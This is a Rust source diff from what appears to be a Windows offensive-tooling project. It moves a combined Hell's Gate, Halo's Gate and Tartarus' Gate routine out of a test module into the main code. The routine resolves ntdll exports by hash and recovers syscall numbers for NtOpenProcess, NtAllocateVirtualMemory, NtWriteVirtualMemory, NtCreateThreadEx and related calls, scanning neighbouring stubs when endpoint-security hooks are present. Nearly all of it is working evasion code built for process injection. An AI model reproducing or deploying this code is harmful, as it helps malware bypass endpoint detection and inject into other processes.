@@ -10,6 +10,264 @@ use windows_sys::Win32::System::{
     },
 };
 
+const NTDLL_HASH: u32 = 0x1edab0ed;
+const NT_OPEN_PROCESS_HASH: u32 = 0x4b82f718;
+const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xf783b8ec;
+const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50e92888;
+const NT_WRITE_VIRTUAL_MEMORY: u32 = 0xc3170192;
+const NT_CREATE_THREAD_EX: u32 = 0xaf18cfb0;
+
+const UP: isize = -32;
+const DOWN: usize = 32;
+
+pub struct VxTableEntry {
+    p_address: *mut u8,
+    w_system_call: u16,
+}
+
+// Do unit testing
+#[cfg(test)]
+mod test {
+    use super::*;
+
+    #[test]
+    fn it_works() {
+        env_logger::init();
+
+        let ntdll_base_address = unsafe {
+            get_loaded_module_by_hash(NTDLL_HASH).expect("Failed to get loaded module by name")
+        };
+
+        log::debug!("[+] NTDLL Address: {:p}", ntdll_base_address);
+
+        let nt_open_process_table = unsafe {
+            hells_halos_tartarus_gate(ntdll_base_address, NT_OPEN_PROCESS_HASH)
+                .expect("Failed to call hells_halos_tartarus_gate")
+        };
+        let nt_allocate_virtual_memory_table = unsafe {
+            hells_halos_tartarus_gate(ntdll_base_address, NT_ALLOCATE_VIRTUAL_MEMORY)
+                .expect("Failed to call hells_halos_tartarus_gate")
+        };
+        let nt_protect_virtual_memory_table = unsafe {
+            hells_halos_tartarus_gate(ntdll_base_address, NT_PROTECT_VIRTUAL_MEMORY)
+                .expect("Failed to call hells_halos_tartarus_gate")
+        };
+        let nt_write_virtual_memory_table = unsafe {
+            hells_halos_tartarus_gate(ntdll_base_address, NT_WRITE_VIRTUAL_MEMORY)
+                .expect("Failed to call hells_halos_tartarus_gate")
+        };
+        let nt_create_thread_ex_table = unsafe {
+            hells_halos_tartarus_gate(ntdll_base_address, NT_CREATE_THREAD_EX)
+                .expect("Failed to call hells_halos_tartarus_gate")
+        };
+
+        log::debug!(
+            "[+] NtOpenProcess: {:p} Syscall: {:#x}",
+            nt_open_process_table.p_address,
+            nt_open_process_table.w_system_call
+        );
+        log::debug!(
+            "[+] NtAllocateVirtualMemory: {:p} Syscall: {:#x}",
+            nt_allocate_virtual_memory_table.p_address,
+            nt_allocate_virtual_memory_table.w_system_call
+        );
+        log::debug!(
+            "[+] NtProtectVirtualMemory: {:p} Syscall: {:#x}",
+            nt_protect_virtual_memory_table.p_address,
+            nt_protect_virtual_memory_table.w_system_call
+        );
+        log::debug!(
+            "[+] NtWriteVirtualMemory: {:p} Syscall: {:#x}",
+            nt_write_virtual_memory_table.p_address,
+            nt_write_virtual_memory_table.w_system_call
+        );
+        log::debug!(
+            "[+] NtCreateThreadEx: {:p} Syscall: {:#x}",
+            nt_create_thread_ex_table.p_address,
+            nt_create_thread_ex_table.w_system_call
+        );
+
+        // Tested on Microsoft Windows 10 Home  10.0.19044 N/A Build 19044 (Unit test will fail in other build versions if syscalls IDs are different)
+        assert_eq!(nt_open_process_table.w_system_call, 0x26);
+        assert_eq!(nt_allocate_virtual_memory_table.w_system_call, 0x18);
+        assert_eq!(nt_protect_virtual_memory_table.w_system_call, 0x50);
+        assert_eq!(nt_write_virtual_memory_table.w_system_call, 0x3a);
+        assert_eq!(nt_create_thread_ex_table.w_system_call, 0xc1);
+
+        //assert_eq!(nt_create_thread_ex_syscall, 0x1337); // testing fail test
+    }
+}
+
+pub unsafe fn hells_halos_tartarus_gate(
+    module_base: *mut u8,
+    module_hash: u32,
+) -> Option<VxTableEntry> {
+    let mut vx_table_entry = VxTableEntry {
+        p_address: get_export_by_hash(module_base, module_hash)
+            .expect("Failed to get export by hash"),
+        w_system_call: 0,
+    };
+    // Hell's gate
+    //
+    //
+
+    //vx_table_entry.w_system_call = find_syscall_number(vx_table_entry.p_address as _);
+
+    // check if the assembly instruction are:
+    // mov r10, rcx
+    // mov rcx, <syscall>
+    if vx_table_entry.p_address.read() == 0x4c
+        && vx_table_entry.p_address.add(1).read() == 0x8b
+        && vx_table_entry.p_address.add(2).read() == 0xd1
+        && vx_table_entry.p_address.add(3).read() == 0xb8
+        && vx_table_entry.p_address.add(6).read() == 0x00
+        && vx_table_entry.p_address.add(7).read() == 0x00
+    {
+        let high = vx_table_entry.p_address.add(5).read();
+        let low = vx_table_entry.p_address.add(4).read();
+        vx_table_entry.w_system_call = ((high.overflowing_shl(8).0) | low) as u16;
+        return Some(vx_table_entry);
+    }
+
+    //
+    // Halo's Gate Patch
+    //
+
+    if vx_table_entry.p_address.read() == 0xe9 {
+        for idx in 1..500 {
+            //
+            // if hooked check the neighborhood to find clean syscall (downwards)
+            //
+
+            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
+                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
+                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
+                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
+                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
+                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
+            {
+                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
+                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
+                vx_table_entry.w_system_call =
+                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
+                return Some(vx_table_entry);
+            }
+
+            //
+            // if hooked check the neighborhood to find clean syscall (upwards)
+            //
+
+            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
+                && vx_table_entry
+                    .p_address
+                    .offset(1 + idx as isize * UP)
+                    .read()
+                    == 0x8b
+                && vx_table_entry
+                    .p_address
+                    .offset(2 + idx as isize * UP)
+                    .read()
+                    == 0xd1
+                && vx_table_entry
+                    .p_address
+                    .offset(3 + idx as isize * UP)
+                    .read()
+                    == 0xb8
+                && vx_table_entry
+                    .p_address
+                    .offset(6 + idx as isize * UP)
+                    .read()
+                    == 0x00
+                && vx_table_entry
+                    .p_address
+                    .offset(7 + idx as isize * UP)
+                    .read()
+                    == 0x00
+            {
+                let high: u8 = vx_table_entry
+                    .p_address
+                    .offset(5 + idx as isize * UP)
+                    .read();
+                let low: u8 = vx_table_entry
+                    .p_address
+                    .offset(4 + idx as isize * UP)
+                    .read();
+                vx_table_entry.w_system_call =
+                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
+                return Some(vx_table_entry);
+            }
+        }
+    }
+
+    //
+    // Tartarus' Gate Patch
+    //
+
+    if vx_table_entry.p_address.add(3).read() == 0xe9 {
+        for idx in 1..500 {
+            if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
+                && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
+                && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
+                && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
+                && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
+                && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
+            {
+                let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
+                let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
+                vx_table_entry.w_system_call =
+                    ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
+                return Some(vx_table_entry);
+            }
+
+            //
+            // if hooked check the neighborhood to find clean syscall (upwards)
+            //
+
+            if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
+                && vx_table_entry
+                    .p_address
+                    .offset(1 + idx as isize * UP)
+                    .read()
+                    == 0x8b
+                && vx_table_entry
+                    .p_address
+                    .offset(2 + idx as isize * UP)
+                    .read()
+                    == 0xd1
+                && vx_table_entry
+                    .p_address
+                    .offset(3 + idx as isize * UP)
+                    .read()
+                    == 0xb8
+                && vx_table_entry
+                    .p_address
+                    .offset(6 + idx as isize * UP)
+                    .read()
+                    == 0x00
+                && vx_table_entry
+                    .p_address
+                    .offset(7 + idx as isize * UP)
+                    .read()
+                    == 0x00
+            {
+                let high: u8 = vx_table_entry
+                    .p_address
+                    .offset(5 + idx as isize * UP)
+                    .read();
+                let low: u8 = vx_table_entry
+                    .p_address
+                    .offset(4 + idx as isize * UP)
+                    .read();
+                vx_table_entry.w_system_call =
+                    ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
+                return Some(vx_table_entry);
+            }
+        }
+    }
+
+    return None;
+}
+
 /// Get process ID by name
 pub fn get_process_id_by_name(target_process: &str) -> usize {
     let mut system = sysinfo::System::new();
@@ -186,261 +444,4 @@ fn find_syscall_number(function_ptr: *mut u8) -> u16 {
     }
 
     return 0;
-}
-
-#[cfg(test)]
-mod test {
-    use super::*;
-
-    const NTDLL_HASH: u32 = 0x1edab0ed;
-    const NT_OPEN_PROCESS_HASH: u32 = 0x4b82f718;
-    const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xf783b8ec;
-    const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50e92888;
-    const NT_WRITE_VIRTUAL_MEMORY: u32 = 0xc3170192;
-    const NT_CREATE_THREAD_EX: u32 = 0xaf18cfb0;
-
-    const UP: isize = -32;
-    const DOWN: usize = 32;
-
-    pub struct VxTableEntry {
-        p_address: *mut u8,
-        w_system_call: u16,
-    }
-
-    #[test]
-    fn it_works() {
-        env_logger::init();
-
-        let ntdll_base_address = unsafe {
-            get_loaded_module_by_hash(NTDLL_HASH).expect("Failed to get loaded module by name")
-        };
-
-        log::debug!("[+] NTDLL Address: {:p}", ntdll_base_address);
-
-        let nt_open_process_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_OPEN_PROCESS_HASH)
-                .expect("Failed to call hells_halos_tartarus_gate")
-        };
-        let nt_allocate_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_ALLOCATE_VIRTUAL_MEMORY)
-                .expect("Failed to call hells_halos_tartarus_gate")
-        };
-        let nt_protect_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_PROTECT_VIRTUAL_MEMORY)
-                .expect("Failed to call hells_halos_tartarus_gate")
-        };
-        let nt_write_virtual_memory_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_WRITE_VIRTUAL_MEMORY)
-                .expect("Failed to call hells_halos_tartarus_gate")
-        };
-        let nt_create_thread_ex_table = unsafe {
-            hells_halos_tartarus_gate(ntdll_base_address, NT_CREATE_THREAD_EX)
-                .expect("Failed to call hells_halos_tartarus_gate")
-        };
-
-        log::debug!(
-            "[+] NtOpenProcess: {:p} Syscall: {:#x}",
-            nt_open_process_table.p_address,
-            nt_open_process_table.w_system_call
-        );
-        log::debug!(
-            "[+] NtAllocateVirtualMemory: {:p} Syscall: {:#x}",
-            nt_allocate_virtual_memory_table.p_address,
-            nt_allocate_virtual_memory_table.w_system_call
-        );
-        log::debug!(
-            "[+] NtProtectVirtualMemory: {:p} Syscall: {:#x}",
-            nt_protect_virtual_memory_table.p_address,
-            nt_protect_virtual_memory_table.w_system_call
-        );
-        log::debug!(
-            "[+] NtWriteVirtualMemory: {:p} Syscall: {:#x}",
-            nt_write_virtual_memory_table.p_address,
-            nt_write_virtual_memory_table.w_system_call
-        );
-        log::debug!(
-            "[+] NtCreateThreadEx: {:p} Syscall: {:#x}",
-            nt_create_thread_ex_table.p_address,
-            nt_create_thread_ex_table.w_system_call
-        );
-
-        // Tested on Microsoft Windows 10 Home  10.0.19044 N/A Build 19044 (Unit test will fail in other build versions if syscalls IDs are different)
-        assert_eq!(nt_open_process_table.w_system_call, 0x26);
-        assert_eq!(nt_allocate_virtual_memory_table.w_system_call, 0x18);
-        assert_eq!(nt_protect_virtual_memory_table.w_system_call, 0x50);
-        assert_eq!(nt_write_virtual_memory_table.w_system_call, 0x3a);
-        assert_eq!(nt_create_thread_ex_table.w_system_call, 0xc1);
-
-        //assert_eq!(nt_create_thread_ex_syscall, 0x1337); // testing fail test
-    }
-
-    pub unsafe fn hells_halos_tartarus_gate(
-        module_base: *mut u8,
-        module_hash: u32,
-    ) -> Option<VxTableEntry> {
-        let mut vx_table_entry = VxTableEntry {
-            p_address: get_export_by_hash(module_base, module_hash)
-                .expect("Failed to get export by hash"),
-            w_system_call: 0,
-        };
-        // Hell's gate
-        //
-        //
-
-        //vx_table_entry.w_system_call = find_syscall_number(vx_table_entry.p_address as _);
-
-        // check if the assembly instruction are:
-        // mov r10, rcx
-        // mov rcx, <syscall>
-        if vx_table_entry.p_address.read() == 0x4c
-            && vx_table_entry.p_address.add(1).read() == 0x8b
-            && vx_table_entry.p_address.add(2).read() == 0xd1
-            && vx_table_entry.p_address.add(3).read() == 0xb8
-            && vx_table_entry.p_address.add(6).read() == 0x00
-            && vx_table_entry.p_address.add(7).read() == 0x00
-        {
-            let high = vx_table_entry.p_address.add(5).read();
-            let low = vx_table_entry.p_address.add(4).read();
-            vx_table_entry.w_system_call = ((high.overflowing_shl(8).0) | low) as u16;
-            return Some(vx_table_entry);
-        }
-
-        //
-        // Halo's Gate Patch
-        //
-
-        if vx_table_entry.p_address.read() == 0xe9 {
-            for idx in 1..500 {
-                //
-                // if hooked check the neighborhood to find clean syscall (downwards)
-                //
-
-                if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
-                    && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
-                    && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
-                    && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
-                    && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
-                    && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
-                {
-                    let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
-                    let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
-                    vx_table_entry.w_system_call =
-                        ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
-                    return Some(vx_table_entry);
-                }
-
-                //
-                // if hooked check the neighborhood to find clean syscall (upwards)
-                //
-
-                if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
-                    && vx_table_entry
-                        .p_address
-                        .offset(1 + idx as isize * UP)
-                        .read()
-                        == 0x8b
-                    && vx_table_entry
-                        .p_address
-                        .offset(2 + idx as isize * UP)
-                        .read()
-                        == 0xd1
-                    && vx_table_entry
-                        .p_address
-                        .offset(3 + idx as isize * UP)
-                        .read()
-                        == 0xb8
-                    && vx_table_entry
-                        .p_address
-                        .offset(6 + idx as isize * UP)
-                        .read()
-                        == 0x00
-                    && vx_table_entry
-                        .p_address
-                        .offset(7 + idx as isize * UP)
-                        .read()
-                        == 0x00
-                {
-                    let high: u8 = vx_table_entry
-                        .p_address
-                        .offset(5 + idx as isize * UP)
-                        .read();
-                    let low: u8 = vx_table_entry
-                        .p_address
-                        .offset(4 + idx as isize * UP)
-                        .read();
-                    vx_table_entry.w_system_call =
-                        ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
-                    return Some(vx_table_entry);
-                }
-            }
-        }
-
-        //
-        // Tartarus' Gate Patch
-        //
-
-        if vx_table_entry.p_address.add(3).read() == 0xe9 {
-            for idx in 1..500 {
-                if vx_table_entry.p_address.add(idx * DOWN).read() == 0x4c
-                    && vx_table_entry.p_address.add(1 + idx * DOWN).read() == 0x8b
-                    && vx_table_entry.p_address.add(2 + idx * DOWN).read() == 0xd1
-                    && vx_table_entry.p_address.add(3 + idx * DOWN).read() == 0xb8
-                    && vx_table_entry.p_address.add(6 + idx * DOWN).read() == 0x00
-                    && vx_table_entry.p_address.add(7 + idx * DOWN).read() == 0x00
-                {
-                    let high: u8 = vx_table_entry.p_address.add(5 + idx * DOWN).read();
-                    let low: u8 = vx_table_entry.p_address.add(4 + idx * DOWN).read();
-                    vx_table_entry.w_system_call =
-                        ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
-                    return Some(vx_table_entry);
-                }
-
-                //
-                // if hooked check the neighborhood to find clean syscall (upwards)
-                //
-
-                if vx_table_entry.p_address.offset(idx as isize * UP).read() == 0x4c
-                    && vx_table_entry
-                        .p_address
-                        .offset(1 + idx as isize * UP)
-                        .read()
-                        == 0x8b
-                    && vx_table_entry
-                        .p_address
-                        .offset(2 + idx as isize * UP)
-                        .read()
-                        == 0xd1
-                    && vx_table_entry
-                        .p_address
-                        .offset(3 + idx as isize * UP)
-                        .read()
-                        == 0xb8
-                    && vx_table_entry
-                        .p_address
-                        .offset(6 + idx as isize * UP)
-                        .read()
-                        == 0x00
-                    && vx_table_entry
-                        .p_address
-                        .offset(7 + idx as isize * UP)
-                        .read()
-                        == 0x00
-                {
-                    let high: u8 = vx_table_entry
-                        .p_address
-                        .offset(5 + idx as isize * UP)
-                        .read();
-                    let low: u8 = vx_table_entry
-                        .p_address
-                        .offset(4 + idx as isize * UP)
-                        .read();
-                    vx_table_entry.w_system_call =
-                        ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
-                    return Some(vx_table_entry);
-                }
-            }
-        }
-
-        return None;
-    }
 }
